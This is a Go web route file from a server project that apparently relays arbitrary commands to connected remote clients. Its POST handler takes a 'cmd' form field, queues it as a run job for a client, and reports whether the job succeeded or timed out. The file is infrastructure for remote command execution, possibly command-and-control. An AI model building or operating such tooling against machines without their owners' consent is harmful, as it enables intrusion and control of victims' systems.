package routes

import (
	"fmt"
	"net/http"

	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/util"
)

func GET_run(c *fiber.Ctx) error {
	client := c.Locals("client").(*database.Client)
	return util.Render(c, "run", fiber.Map{
		"client": client,
	})
}

func POST_run(c *fiber.Ctx) error {
	var (
		client *database.Client
		jobs   *joblist.Type
		job    *joblist.Job
		err    error
	)

	client = c.Locals("client").(*database.Client)
	jobs = c.Locals("joblist").(*joblist.Type)

	body := struct {
		Cmd string `form:"cmd"`
	}{}

	if err = c.BodyParser(&body); err != nil {
		return util.RenderErr(c, "invalid form data", http.StatusBadRequest)
	}

	data := util.NewBuffer(body.Cmd)
	res := util.NewBuffer()

	if job, err = jobs.Add(client.ID, joblist.CMD_RUN, data, res); err != nil {
		log.Fail("failed to add command run job: %s", err.Error())
		return util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	defer jobs.Del(job.ID)

	if !job.Wait() {
		log.Debg("command run job timed out for %s", client.ID)
		return util.RenderErr(c, "client timeout", http.StatusGatewayTimeout)
	}

	if res.String() != "success" {
		return util.RenderErr(c, fmt.Sprintf(
			"run job failed: %s", res.String(),
		), http.StatusGatewayTimeout)
	}

	return util.Redirect(c, "/")
}
